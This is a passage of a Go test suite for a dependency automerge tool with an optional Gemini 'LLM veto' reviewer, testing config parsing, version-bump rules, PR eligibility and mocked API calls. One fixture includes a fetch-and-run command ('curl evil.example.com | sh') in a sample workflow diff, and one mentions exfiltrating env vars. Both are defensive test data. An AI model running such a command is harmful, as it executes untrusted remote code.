package main

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/kachick/workflows/internal/workflowmeta"
)

func TestParseConfigDefaults(t *testing.T) {
	cfg, err := parseConfig([]string{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if cfg.MergeMethod != "squash" {
		t.Errorf("expected default merge-method 'squash', got %q", cfg.MergeMethod)
	}
	if !slices.Equal(cfg.AllowedBots, defaultAllowedBots) {
		t.Errorf("expected default allowed bots, got %v", cfg.AllowedBots)
	}
	if cfg.LLMVeto {
		t.Errorf("expected default llm-veto false, got %v", cfg.LLMVeto)
	}
	if cfg.GeminiAPIKey != "" {
		t.Errorf("expected default gemini-api-key empty, got %q", cfg.GeminiAPIKey)
	}
	if cfg.GeminiModel != "gemini-flash-latest" {
		t.Errorf("expected default gemini-model 'gemini-flash-latest', got %q", cfg.GeminiModel)
	}
}

func TestParseConfigFlags(t *testing.T) {
	args := []string{
		"--merge-method=rebase",
		"--allowed-bots=custom-bot,another-bot",
		"--llm-veto=true",
		"--gemini-api-key=test-key",
		"--gemini-model=custom-model",
	}

	cfg, err := parseConfig(args)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if cfg.MergeMethod != "rebase" {
		t.Errorf("expected 'rebase', got %q", cfg.MergeMethod)
	}
	expectedBots := []string{"custom-bot", "another-bot"}
	if !slices.Equal(cfg.AllowedBots, expectedBots) {
		t.Errorf("expected %v, got %v", expectedBots, cfg.AllowedBots)
	}
	if !cfg.LLMVeto {
		t.Errorf("expected llm-veto true, got %v", cfg.LLMVeto)
	}
	if cfg.GeminiAPIKey != "test-key" {
		t.Errorf("expected gemini-api-key 'test-key', got %q", cfg.GeminiAPIKey)
	}
	if cfg.GeminiModel != "custom-model" {
		t.Errorf("expected gemini-model 'custom-model', got %q", cfg.GeminiModel)
	}
}

func TestParseConfigInvalidMethod(t *testing.T) {
	_, err := parseConfig([]string{"--merge-method=invalid"})
	if err == nil {
		t.Errorf("expected error for invalid merge-method, got nil")
	}
}

func TestParseConfigEnvFallback(t *testing.T) {
	t.Setenv("MERGE_METHOD", "merge")
	t.Setenv("ALLOWED_BOTS", "env-bot")
	t.Setenv("LLM_VETO", "true")
	t.Setenv("GEMINI_API_KEY", "env-api-key")
	t.Setenv("GEMINI_MODEL", "env-model")

	cfg, err := parseConfig([]string{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if cfg.MergeMethod != "merge" {
		t.Errorf("expected merge-method from env, got %q", cfg.MergeMethod)
	}
	expectedBots := []string{"env-bot"}
	if !slices.Equal(cfg.AllowedBots, expectedBots) {
		t.Errorf("expected %v, got %v", expectedBots, cfg.AllowedBots)
	}
	if !cfg.LLMVeto {
		t.Errorf("expected llm-veto from env, got %v", cfg.LLMVeto)
	}
	if cfg.GeminiAPIKey != "env-api-key" {
		t.Errorf("expected gemini-api-key from env, got %q", cfg.GeminiAPIKey)
	}
	if cfg.GeminiModel != "env-model" {
		t.Errorf("expected gemini-model from env, got %q", cfg.GeminiModel)
	}
}

func TestParseAllowedBots(t *testing.T) {
	tests := []struct {
		input    string
		expected []string
	}{
		{input: "", expected: defaultAllowedBots},
		{input: "   ", expected: defaultAllowedBots},
		{input: "bot1, bot2 , ,bot3", expected: []string{"bot1", "bot2", "bot3"}},
	}

	for _, tc := range tests {
		got := parseAllowedBots(tc.input)
		if !slices.Equal(got, tc.expected) {
			t.Errorf("parseAllowedBots(%q) = %v, want %v", tc.input, got, tc.expected)
		}
	}
}

func TestIsDisallowedDependabotMajor(t *testing.T) {
	tests := []struct {
		title      string
		disallowed bool
	}{
		{title: "Bump actions/checkout from 4.0.0 to 4.1.0", disallowed: false},
		{title: "Bump actions/checkout from v4.0.0 to v4.0.1", disallowed: false},
		{title: "Bump actions/checkout from 3.0.0 to 4.0.0", disallowed: true},
		{title: "Bump actions/checkout from v3.0.0 to v4.0.0", disallowed: true},
		{title: "Bump actions/checkout from 4.0.0 to 4.1.0 in /.github/workflows", disallowed: false},
		{title: "Bump actions/checkout from 3.0.0 to 4.0.0 in /.github/workflows", disallowed: true},
		{title: "Bump cachix/cachix-action from 14 to 15", disallowed: true},
		{title: "Bump cachix/install-nix-action from v26 to v27", disallowed: true},
		{title: "Bump the rust group with 2 updates", disallowed: true},
		{title: "Bump the dev-dependencies group in /sub/dir with 3 updates", disallowed: true},
		{title: "Bump foo from 0.1.0 to 0.2.0", disallowed: false},
		{title: "Bump foo from 0.1.0 to 0.1.1", disallowed: false},
		{title: "Bump foo from v0.1.0 to v0.2.0", disallowed: false},
		{title: "Bump foo from v0.1.0 to v0.1.1", disallowed: false},
		{title: "Bump foo from 0.1 to 0.2", disallowed: false},
		{title: "Bump foo from 0.1 to 0.1.1", disallowed: false},
		{title: "Bump foo from 0.9.0 to 1.0.0", disallowed: false},
		{title: "Bump foo from 0.1.0 to 2.0.0", disallowed: true},
		{title: "Bump golang.org/x/sys from 0.48.0 to 0.49.0", disallowed: false},
		{title: "Update dependencies", disallowed: true},
	}

	for _, tc := range tests {
		got := isDisallowedDependabotMajor(tc.title)
		if got != tc.disallowed {
			t.Errorf("isDisallowedDependabotMajor(%q) = %v, want %v", tc.title, got, tc.disallowed)
		}
	}
}

const validRenovateBody = "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [foo](https://example.com) | minor | `1.0.0` -> `1.1.0` |\n"

func TestIsEligible(t *testing.T) {
	validChecks := []StatusCheckItem{
		{Status: "COMPLETED", Conclusion: "SUCCESS"},
		{Status: "COMPLETED", Conclusion: "SUCCESS"},
	}

	basePR := PullRequest{
		Number:            1,
		Title:             "Update dependency",
		Body:              validRenovateBody,
		Author:            Author{Login: "renovate[bot]"},
		IsDraft:           false,
		Mergeable:         "MERGEABLE",
		StatusCheckRollup: validChecks,
	}

	if !isEligible(basePR, defaultAllowedBots) {
		t.Errorf("expected basePR to be eligible")
	}

	// Not allowed author
	unallowedAuthor := basePR
	unallowedAuthor.Author.Login = "attacker[bot]"
	if isEligible(unallowedAuthor, defaultAllowedBots) {
		t.Errorf("unallowed author should not be eligible")
	}

	// Draft PR
	draftPR := basePR
	draftPR.IsDraft = true
	if isEligible(draftPR, defaultAllowedBots) {
		t.Errorf("draft PR should not be eligible")
	}

	// Not mergeable
	conflictPR := basePR
	conflictPR.Mergeable = "CONFLICTING"
	if isEligible(conflictPR, defaultAllowedBots) {
		t.Errorf("conflicting PR should not be eligible")
	}

	// Empty checks
	noChecksPR := basePR
	noChecksPR.StatusCheckRollup = []StatusCheckItem{}
	if isEligible(noChecksPR, defaultAllowedBots) {
		t.Errorf("PR without checks should not be eligible")
	}

	// In-progress checks
	inProgressPR := basePR
	inProgressPR.StatusCheckRollup = []StatusCheckItem{
		{Status: "IN_PROGRESS", Conclusion: ""},
	}
	if isEligible(inProgressPR, defaultAllowedBots) {
		t.Errorf("PR with in-progress checks should not be eligible")
	}

	// Failed checks
	failedPR := basePR
	failedPR.StatusCheckRollup = []StatusCheckItem{
		{Status: "COMPLETED", Conclusion: "FAILURE"},
	}
	if isEligible(failedPR, defaultAllowedBots) {
		t.Errorf("PR with failed checks should not be eligible")
	}

	// Skipped checks (eligible)
	skippedPR := basePR
	skippedPR.StatusCheckRollup = []StatusCheckItem{
		{Status: "COMPLETED", Conclusion: "SKIPPED"},
	}
	if !isEligible(skippedPR, defaultAllowedBots) {
		t.Errorf("PR with skipped checks should be eligible")
	}

	// Neutral checks (eligible)
	neutralPR := basePR
	neutralPR.StatusCheckRollup = []StatusCheckItem{
		{Status: "COMPLETED", Conclusion: "NEUTRAL"},
	}
	if !isEligible(neutralPR, defaultAllowedBots) {
		t.Errorf("PR with neutral checks should be eligible")
	}

	// Timed out checks
	timedOutPR := basePR
	timedOutPR.StatusCheckRollup = []StatusCheckItem{
		{Status: "COMPLETED", Conclusion: "TIMED_OUT"},
	}
	if isEligible(timedOutPR, defaultAllowedBots) {
		t.Errorf("PR with timed out checks should not be eligible")
	}

	// Cancelled checks
	cancelledPR := basePR
	cancelledPR.StatusCheckRollup = []StatusCheckItem{
		{Status: "COMPLETED", Conclusion: "CANCELLED"},
	}
	if isEligible(cancelledPR, defaultAllowedBots) {
		t.Errorf("PR with cancelled checks should not be eligible")
	}

	// Dependabot major bump (disallowed)
	dependabotMajorPR := basePR
	dependabotMajorPR.Author.Login = "dependabot[bot]"
	dependabotMajorPR.Title = "Bump actions/checkout from 3.0.0 to 4.0.0"
	if isEligible(dependabotMajorPR, defaultAllowedBots) {
		t.Errorf("Dependabot major bump should not be eligible")
	}

	// Dependabot minor bump (eligible)
	dependabotMinorPR := basePR
	dependabotMinorPR.Author.Login = "dependabot[bot]"
	dependabotMinorPR.Title = "Bump actions/checkout from 4.0.0 to 4.1.0"
	if !isEligible(dependabotMinorPR, defaultAllowedBots) {
		t.Errorf("Dependabot minor bump should be eligible")
	}

	// Dependabot subdirectory minor bump (eligible)
	dependabotSubdirMinorPR := basePR
	dependabotSubdirMinorPR.Author.Login = "dependabot[bot]"
	dependabotSubdirMinorPR.Title = "Bump actions/checkout from 4.0.0 to 4.1.0 in /.github/workflows"
	if !isEligible(dependabotSubdirMinorPR, defaultAllowedBots) {
		t.Errorf("Dependabot subdirectory minor bump should be eligible")
	}

	// Dependabot subdirectory major bump (disallowed)
	dependabotSubdirMajorPR := basePR
	dependabotSubdirMajorPR.Author.Login = "dependabot[bot]"
	dependabotSubdirMajorPR.Title = "Bump actions/checkout from 3.0.0 to 4.0.0 in /.github/workflows"
	if isEligible(dependabotSubdirMajorPR, defaultAllowedBots) {
		t.Errorf("Dependabot subdirectory major bump should not be eligible")
	}

	// Dependabot group update (disallowed)
	dependabotGroupPR := basePR
	dependabotGroupPR.Author.Login = "dependabot[bot]"
	dependabotGroupPR.Title = "Bump the rust group with 2 updates"
	if isEligible(dependabotGroupPR, defaultAllowedBots) {
		t.Errorf("Dependabot group update should not be eligible")
	}

	// Dependabot cachix major bump (disallowed)
	dependabotCachixPR := basePR
	dependabotCachixPR.Author.Login = "dependabot[bot]"
	dependabotCachixPR.Title = "Bump cachix/cachix-action from 14 to 15"
	if isEligible(dependabotCachixPR, defaultAllowedBots) {
		t.Errorf("Dependabot cachix major bump should not be eligible")
	}

	// Renovate major bump (disallowed)
	renovateMajorPR := basePR
	renovateMajorPR.Author.Login = "renovate[bot]"
	renovateMajorPR.Body = "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [actions/checkout](https://example.com) | major | `3.0.0` -> `4.0.0` |\n"
	if isEligible(renovateMajorPR, defaultAllowedBots) {
		t.Errorf("Renovate major bump should not be eligible")
	}

	// Renovate 0.x minor bump (eligible)
	renovate0xPR := basePR
	renovate0xPR.Author.Login = "renovate[bot]"
	renovate0xPR.Body = "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [dprint/dprint-plugin-markdown](https://example.com) | minor | `0.24.0` → `0.26.0` |\n"
	if !isEligible(renovate0xPR, defaultAllowedBots) {
		t.Errorf("Renovate 0.x bump should be eligible")
	}

	// Renovate unrecognized body (disallowed)
	renovateInvalidBodyPR := basePR
	renovateInvalidBodyPR.Author.Login = "renovate[bot]"
	renovateInvalidBodyPR.Body = "Unrecognized body without table"
	if isEligible(renovateInvalidBodyPR, defaultAllowedBots) {
		t.Errorf("Renovate unrecognized body should not be eligible")
	}
}

type mockRunner struct {
	prs              []PullRequest
	fetchPRResponses map[int][]*PullRequest
	fetchPRErrOn     map[int]error
	fetchPRCalls     map[int]int
	diffs            map[int]string
	fetchErr         error
	diffErrOn        map[int]error
	ensuredLabels    []string
	addedLabels      map[int][]string
	mergedPRs        []int
	mergeErrOn       map[int]error
	comments         map[int][]string
	commentErrOn     map[int]error
}

func (m *mockRunner) FetchOpenPRs(ctx context.Context) ([]PullRequest, error) {
	if m.fetchErr != nil {
		return nil, m.fetchErr
	}
	return m.prs, nil
}

func (m *mockRunner) FetchPR(ctx context.Context, number int) (*PullRequest, error) {
	if m.fetchPRCalls == nil {
		m.fetchPRCalls = make(map[int]int)
	}
	m.fetchPRCalls[number]++

	if err, ok := m.fetchPRErrOn[number]; ok {
		return nil, err
	}

	if responses, ok := m.fetchPRResponses[number]; ok && len(responses) > 0 {
		callIdx := m.fetchPRCalls[number] - 1
		if callIdx < len(responses) {
			return responses[callIdx], nil
		}
		return responses[len(responses)-1], nil
	}

	for _, pr := range m.prs {
		if pr.Number == number {
			return &pr, nil
		}
	}
	return nil, fmt.Errorf("pr %d not found", number)
}

func (m *mockRunner) FetchPRDiff(ctx context.Context, number int) (string, error) {
	if err, ok := m.diffErrOn[number]; ok {
		return "", err
	}
	if diff, ok := m.diffs[number]; ok {
		return diff, nil
	}
	return "diff --git a/go.mod b/go.mod\n+example", nil
}

func (m *mockRunner) EnsureLabel(ctx context.Context, name, description, color string) error {
	m.ensuredLabels = append(m.ensuredLabels, name)
	return nil
}

func (m *mockRunner) AddLabelToPR(ctx context.Context, number int, label string) error {
	if m.addedLabels == nil {
		m.addedLabels = make(map[int][]string)
	}
	m.addedLabels[number] = append(m.addedLabels[number], label)
	return nil
}

func (m *mockRunner) MergePR(ctx context.Context, number int, method string) error {
	if err, ok := m.mergeErrOn[number]; ok {
		return err
	}
	m.mergedPRs = append(m.mergedPRs, number)
	return nil
}

func (m *mockRunner) CommentPR(ctx context.Context, number int, body string) error {
	if err, ok := m.commentErrOn[number]; ok {
		return err
	}
	if m.comments == nil {
		m.comments = make(map[int][]string)
	}
	m.comments[number] = append(m.comments[number], body)
	return nil
}

type mockReviewer struct {
	reviews    map[int]vetoDecision
	reviewErrs map[int]error
	calledOn   []int
}

func (m *mockReviewer) ReviewPR(ctx context.Context, pr PullRequest, diff string) (bool, string, error) {
	m.calledOn = append(m.calledOn, pr.Number)
	if err, ok := m.reviewErrs[pr.Number]; ok {
		return false, "", err
	}
	if decision, ok := m.reviews[pr.Number]; ok {
		return decision.Veto, decision.Reason, nil
	}
	return false, "default mock pass", nil
}

type mockVulnScanner struct {
	scans    map[int]vetoDecision
	scanErrs map[int]error
	calledOn []int
}

func (m *mockVulnScanner) ScanPR(ctx context.Context, pr PullRequest, diff string) (bool, string, error) {
	m.calledOn = append(m.calledOn, pr.Number)
	if err, ok := m.scanErrs[pr.Number]; ok {
		return false, "", err
	}
	if decision, ok := m.scans[pr.Number]; ok {
		return decision.Veto, decision.Reason, nil
	}
	return false, "default mock vuln pass", nil
}

func TestExecute(t *testing.T) {
	validChecks := []StatusCheckItem{
		{Status: "COMPLETED", Conclusion: "SUCCESS"},
	}

	runner := &mockRunner{
		prs: []PullRequest{
			{
				Number:            101,
				Title:             "Renovate PR",
				Body:              validRenovateBody,
				Author:            Author{Login: "renovate[bot]"},
				Mergeable:         "MERGEABLE",
				StatusCheckRollup: validChecks,
			},
			{
				Number:            102,
				Title:             "Draft PR",
				Body:              validRenovateBody,
				Author:            Author{Login: "renovate[bot]"},
				IsDraft:           true,
				Mergeable:         "MERGEABLE",
				StatusCheckRollup: validChecks,
			},
			{
				Number:            103,
				Title:             "Samuebot PR",
				Author:            Author{Login: "samuebot[bot]"},
				Mergeable:         "MERGEABLE",
				StatusCheckRollup: validChecks,
			},
		},
		mergeErrOn: map[int]error{
			101: errors.New("simulated merge conflict"),
		},
	}

	cfg := &Config{
		AllowedBots: defaultAllowedBots,
		MergeMethod: "squash",
	}

	err := execute(context.Background(), cfg, runner, nil, nil, workflowmeta.Metadata{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// 101 should fail, 102 is skipped (draft), 103 should succeed
	expectedMerged := []int{103}
	if !slices.Equal(runner.mergedPRs, expectedMerged) {
		t.Errorf("expected merged PRs %v, got %v", expectedMerged, runner.mergedPRs)
	}
}

func TestExecuteNoOpenPRs(t *testing.T) {
	runner := &mockRunner{prs: []PullRequest{}}
	cfg := &Config{AllowedBots: defaultAllowedBots, MergeMethod: "squash"}
	if err := execute(context.Background(), cfg, runner, nil, nil, workflowmeta.Metadata{}); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestExecuteLLMVeto(t *testing.T) {
	validChecks := []StatusCheckItem{
		{Status: "COMPLETED", Conclusion: "SUCCESS"},
	}

	prs := []PullRequest{
		{
			Number:            201,
			Title:             "Safe renovate PR",
			Body:              validRenovateBody,
			Author:            Author{Login: "renovate[bot]"},
			Mergeable:         "MERGEABLE",
			StatusCheckRollup: validChecks,
		},
		{
			Number:            202,
			Title:             "Breaking renovate PR",
			Body:              validRenovateBody,
			Author:            Author{Login: "renovate[bot]"},
			Mergeable:         "MERGEABLE",
			StatusCheckRollup: validChecks,
		},
		{
			Number:            203,
			Title:             "Flaky API renovate PR",
			Body:              validRenovateBody,
			Author:            Author{Login: "renovate[bot]"},
			Mergeable:         "MERGEABLE",
			StatusCheckRollup: validChecks,
		},
		{
			Number:            204,
			Title:             "Diff error renovate PR",
			Body:              validRenovateBody,
			Author:            Author{Login: "renovate[bot]"},
			Mergeable:         "MERGEABLE",
			StatusCheckRollup: validChecks,
		},
	}

	runner := &mockRunner{
		prs: prs,
		diffErrOn: map[int]error{
			204: errors.New("simulated git diff error"),
		},
	}

	reviewer := &mockReviewer{
		reviews: map[int]vetoDecision{
			201: {Veto: false, Reason: "clean patch update"},
			202: {Veto: true, Reason: "breaking change found in release notes"},
		},
		reviewErrs: map[int]error{
			203: errors.New("gemini api 503 rate limit"),
		},
	}

	cfg := &Config{
		AllowedBots:  defaultAllowedBots,
		MergeMethod:  "squash",
		LLMVeto:      true,
		GeminiAPIKey: "dummy-key",
		GeminiModel:  "gemini-3.8-flash",
	}

	err := execute(context.Background(), cfg, runner, reviewer, nil, workflowmeta.Metadata{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// 201: pass (merged)
	// 202: veto (skipped)
	// 203: review error (skipped gracefully)
	// 204: diff error (skipped gracefully)
	expectedMerged := []int{201}
	if !slices.Equal(runner.mergedPRs, expectedMerged) {
		t.Errorf("expected merged PRs %v, got %v", expectedMerged, runner.mergedPRs)
	}

	expectedCalled := []int{201, 202, 203}
	if !slices.Equal(reviewer.calledOn, expectedCalled) {
		t.Errorf("expected reviewer called on %v, got %v", expectedCalled, reviewer.calledOn)
	}

	// 202 should be marked with automerge:vetoed label
	if !slices.Equal(runner.addedLabels[202], []string{vetoLabelName}) {
		t.Errorf("expected PR 202 to have label %v, got %v", []string{vetoLabelName}, runner.addedLabels[202])
	}
	if !slices.Contains(runner.ensuredLabels, vetoLabelName) {
		t.Errorf("expected ensuredLabels to contain %q, got %v", vetoLabelName, runner.ensuredLabels)
	}

	// 201 should have merge comment with passing LLM veto step
	if len(runner.comments[201]) != 1 {
		t.Fatalf("expected 1 comment on PR 201, got %v", runner.comments[201])
	}
	if !strings.Contains(runner.comments[201][0], "- :white_check_mark: LLM veto: no risks detected") {
		t.Errorf("expected PR 201 comment to contain passing LLM veto step, got %q", runner.comments[201][0])
	}

	// 202 should have veto comment with reason
	if len(runner.comments[202]) != 1 {
		t.Fatalf("expected 1 comment on PR 202, got %v", runner.comments[202])
	}
	if !strings.Contains(runner.comments[202][0], "Automerge was vetoed by LLM veto: breaking change found in release notes.") {
		t.Errorf("expected PR 202 comment to contain veto header, got %q", runner.comments[202][0])
	}
	if !strings.Contains(runner.comments[202][0], "- :x: LLM veto: breaking change found in release notes") {
		t.Errorf("expected PR 202 comment to contain veto step, got %q", runner.comments[202][0])
	}

	// Subsequent runs must skip already vetoed PRs without calling reviewer or spending tokens
	reviewer.calledOn = nil
	runner.prs = []PullRequest{
		{
			Number:            202,
			Title:             "Breaking renovate PR",
			Body:              validRenovateBody,
			Author:            Author{Login: "renovate[bot]"},
			Mergeable:         "MERGEABLE",
			StatusCheckRollup: validChecks,
			Labels:            []Label{{Name: vetoLabelName}},
		},
	}
	runner.mergedPRs = nil
	if err := execute(context.Background(), cfg, runner, reviewer, nil, workflowmeta.Metadata{}); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(reviewer.calledOn) != 0 {
		t.Errorf("expected reviewer not to be called for vetoed PR, got %v", reviewer.calledOn)
	}
	if len(runner.mergedPRs) != 0 {
		t.Errorf("expected no PRs merged, got %v", runner.mergedPRs)
	}
}

func TestExecuteLLMVetoMissingAPIKey(t *testing.T) {
	validChecks := []StatusCheckItem{
		{Status: "COMPLETED", Conclusion: "SUCCESS"},
	}

	runner := &mockRunner{
		prs: []PullRequest{
			{
				Number:            301,
				Title:             "Renovate PR",
				Body:              validRenovateBody,
				Author:            Author{Login: "renovate[bot]"},
				Mergeable:         "MERGEABLE",
				StatusCheckRollup: validChecks,
			},
		},
	}

	cfg := &Config{
		AllowedBots:  defaultAllowedBots,
		MergeMethod:  "squash",
		LLMVeto:      true,
		GeminiAPIKey: "", // missing API key
	}

	err := execute(context.Background(), cfg, runner, nil, nil, workflowmeta.Metadata{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Merging should be skipped safely when key is missing to avoid unreviewed merges
	if len(runner.mergedPRs) != 0 {
		t.Errorf("expected 0 merged PRs when API key is missing, got %v", runner.mergedPRs)
	}
}

func TestEvaluateGeminiReport(t *testing.T) {
	tests := []struct {
		name       string
		report     geminiReviewReport
		wantVeto   bool
		wantReason string
	}{
		{
			name: "low risk without findings passes",
			report: geminiReviewReport{
				RiskLevel: "LOW",
				Summary:   "routine patch update",
				Findings:  []geminiFinding{},
			},
			wantVeto:   false,
			wantReason: "routine patch update",
		},
		{
			name: "medium findings pass with summary",
			report: geminiReviewReport{
				RiskLevel: "MEDIUM",
				Summary:   "deprecation warning in comments",
				Findings: []geminiFinding{
					{
						Severity:    "MEDIUM",
						Category:    "deprecation",
						Description: "deprecated function used",
					},
				},
			},
			wantVeto:   false,
			wantReason: "deprecation warning in comments",
		},
		{
			name: "critical risk level triggers veto",
			report: geminiReviewReport{
				RiskLevel: "CRITICAL",
				Summary:   "unannounced core package replacement",
				Findings:  []geminiFinding{},
			},
			wantVeto:   true,
			wantReason: "[CRITICAL] unannounced core package replacement",
		},
		{
			name: "high finding triggers veto and reports details",
			report: geminiReviewReport{
				RiskLevel: "LOW",
				Summary:   "mostly fine but suspicious network call",
				Findings: []geminiFinding{
					{
						Severity:    "HIGH",
						Category:    "suspicious_network",
						Description: "exfiltrates env vars to external domain",
					},
				},
			},
			wantVeto:   true,
			wantReason: "[HIGH] suspicious_network: exfiltrates env vars to external domain",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotVeto, gotReason := evaluateGeminiReport(tt.report)
			if gotVeto != tt.wantVeto {
				t.Errorf("evaluateGeminiReport() gotVeto = %v, want %v", gotVeto, tt.wantVeto)
			}
			if gotReason != tt.wantReason {
				t.Errorf("evaluateGeminiReport() gotReason = %q, want %q", gotReason, tt.wantReason)
			}
		})
	}
}

func TestGeminiReviewerHTTP(t *testing.T) {
	t.Run("successful approval", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.Method != http.MethodPost {
				t.Errorf("expected POST, got %s", r.Method)
			}
			if key := r.URL.Query().Get("key"); key != "" {
				t.Errorf("API key must not be in URL query, got %q", key)
			}
			if key := r.Header.Get("x-goog-api-key"); key != "test-api-key" {
				t.Errorf("expected x-goog-api-key header 'test-api-key', got %q", key)
			}

			bodyBytes, err := io.ReadAll(r.Body)
			if err != nil {
				t.Fatalf("failed to read request body: %v", err)
			}
			var reqPayload geminiRequest
			if err := json.Unmarshal(bodyBytes, &reqPayload); err != nil {
				t.Fatalf("failed to unmarshal request payload: %v", err)
			}
			if reqPayload.SystemInstruction == nil || len(reqPayload.SystemInstruction.Parts) == 0 {
				t.Errorf("expected systemInstruction to be set")
			}

			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write([]byte(`{
				"candidates": [
					{
						"content": {
							"parts": [
								{
									"text": "{\"risk_level\": \"LOW\", \"summary\": \"safe patch update\", \"findings\": []}"
								}
							]
						}
					}
				]
			}`))
		}))
		defer server.Close()

		reviewer := &GeminiReviewer{
			APIKey:     "test-api-key",
			Model:      "gemini-3.8-flash",
			BaseURL:    server.URL,
			HTTPClient: server.Client(),
		}

		pr := PullRequest{
			Number: 1,
			Title:  "Bump foo from 1.0.0 to 1.0.1",
			Author: Author{Login: "dependabot[bot]"},
			Body:   "Release notes: fix bug",
		}

		veto, reason, err := reviewer.ReviewPR(context.Background(), pr, "+some diff")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if veto {
			t.Errorf("expected veto false, got true")
		}
		if reason != "safe patch update" {
			t.Errorf("expected reason 'safe patch update', got %q", reason)
		}
	})

	t.Run("successful veto", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write([]byte(`{
				"candidates": [
					{
						"content": {
							"parts": [
								{
									"text": "{\"risk_level\": \"HIGH\", \"summary\": \"breaking change detected\", \"findings\": [{\"severity\": \"HIGH\", \"category\": \"breaking_change\", \"description\": \"removed foo()\"}]}"
								}
							]
						}
					}
				]
			}`))
		}))
		defer server.Close()

		reviewer := &GeminiReviewer{
			APIKey:     "test-api-key",
			Model:      "gemini-3.8-flash",
			BaseURL:    server.URL,
			HTTPClient: server.Client(),
		}

		pr := PullRequest{
			Number: 2,
			Title:  "Bump bar from 1.0.0 to 2.0.0",
			Author: Author{Login: "dependabot[bot]"},
			Body:   "Breaking changes: removed foo()",
		}

		veto, reason, err := reviewer.ReviewPR(context.Background(), pr, "-foo()\n+bar()")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if !veto {
			t.Errorf("expected veto true, got false")
		}
		if reason != "[HIGH] breaking_change: removed foo()" {
			t.Errorf("expected reason '[HIGH] breaking_change: removed foo()', got %q", reason)
		}
	})

	t.Run("server error returns error", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusInternalServerError)
			_, _ = w.Write([]byte("Internal Server Error"))
		}))
		defer server.Close()

		reviewer := &GeminiReviewer{
			APIKey:     "test-api-key",
			Model:      "gemini-3.8-flash",
			BaseURL:    server.URL,
			HTTPClient: server.Client(),
		}

		pr := PullRequest{Number: 3}
		_, _, err := reviewer.ReviewPR(context.Background(), pr, "")
		if err == nil {
			t.Errorf("expected error on 500, got nil")
		}
	})

	t.Run("network error does not leak API key in error string", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {}))
		// Close immediately to force a connection refused (*url.Error)
		server.Close()

		secretKey := "AIzaSySecretKeyForTest123456789"
		reviewer := &GeminiReviewer{
			APIKey:     secretKey,
			Model:      "gemini-3.8-flash",
			BaseURL:    server.URL,
			HTTPClient: server.Client(),
		}

		pr := PullRequest{Number: 4}
		_, _, err := reviewer.ReviewPR(context.Background(), pr, "")
		if err == nil {
			t.Fatal("expected network error, got nil")
		}
		if strings.Contains(err.Error(), secretKey) {
			t.Errorf("network error leaked API key: %v", err)
		}
	})
}

func TestTruncateTextAndPrioritizeDiff(t *testing.T) {
	t.Run("truncates safely on UTF-8 rune boundaries", func(t *testing.T) {
		// '→' is 3 bytes (0xE2 0x86 0x92) at indices 4..6
		input := "1.0 → 2.0"
		got := truncateText(input, 5)
		if !utf8.ValidString(got) {
			t.Fatalf("truncateText produced invalid UTF-8: %q", got)
		}
		if !strings.HasPrefix(got, "1.0 \n...[truncated]") {
			t.Errorf("unexpected truncated output: %q", got)
		}
	})

	t.Run("places code and workflow diffs before lockfiles", func(t *testing.T) {
		lockDiff := "diff --git a/flake.lock b/flake.lock\n--- a/flake.lock\n+++ b/flake.lock\n+" + strings.Repeat("a", maxDiffLength) + "\n"
		workflowDiff := "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n+run: curl evil.example.com | sh\n"

		combined := lockDiff + workflowDiff
		prioritized := prioritizeDiff(combined)
		truncated := truncateText(prioritized, maxDiffLength)

		if !strings.Contains(truncated, "curl evil.example.com") {
			t.Errorf("expected workflow diff to survive truncation ahead of flake.lock, got:\n%s", truncated)
		}
	})
}

func TestCheckDependabotBump(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		body       string
		disallowed bool
		wantReason string
	}{
		{
			name:       "standard minor update",
			title:      "Bump actions/checkout from 4.0.0 to 4.1.0",
			disallowed: false,
			wantReason: "non-breaking update",
		},
		{
			name:       "standard major update",
			title:      "Bump actions/checkout from 3.0.0 to 4.0.0",
			disallowed: true,
			wantReason: "major update (3.0.0 -> 4.0.0)",
		},
		{
			name:       "0.x update",
			title:      "Bump golang.org/x/sys from 0.48.0 to 0.49.0",
			disallowed: false,
			wantReason: "allowed 0.x or initial stable release",
		},
		{
			name:       "0.x to 1.0.0 update",
			title:      "Bump foo from 0.9.0 to 1.0.0",
			disallowed: false,
			wantReason: "allowed 0.x or initial stable release",
		},
		{
			name:       "0.x to 2.0.0 update",
			title:      "Bump foo from 0.1.0 to 2.0.0",
			disallowed: true,
			wantReason: "major update (0.1.0 -> 2.0.0)",
		},
		{
			name:       "major update integer only",
			title:      "Bump cachix/cachix-action from 14 to 15",
			disallowed: true,
			wantReason: "major update (14 -> 15)",
		},
		{
			name:       "container digest update in title",
			title:      "Bump ghcr.io/kachick/ubuntu-26.04-nix-systemd from `99230df` to `8297d9b`",
			disallowed: false,
